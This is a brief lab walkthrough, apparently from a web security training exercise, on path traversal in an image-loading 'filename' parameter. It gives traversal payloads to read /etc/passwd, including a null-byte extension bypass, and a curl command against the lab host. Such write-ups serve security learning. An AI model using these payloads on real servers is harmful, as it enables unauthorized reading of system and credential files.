1) visit the homepage and visit a product
2) open the imaghe into another tab and change ?filename=111.jpg to ?filename=../../../etc/passwd
but it is blocked 

so we try 
?filename=/etc/passwd but nothing, so we try to see if the sanitization is done only on file extension 

?filename=../../../etc/passwd%00.jpg

the idea is that the null byte is removed from the path but the validation is ok 


3) browsers will not show the results because the image has an error but we can use curl
     curl lab.net/image?filename=../../../etc/passwd%00.jpg

4) in this way we can read the passwd file



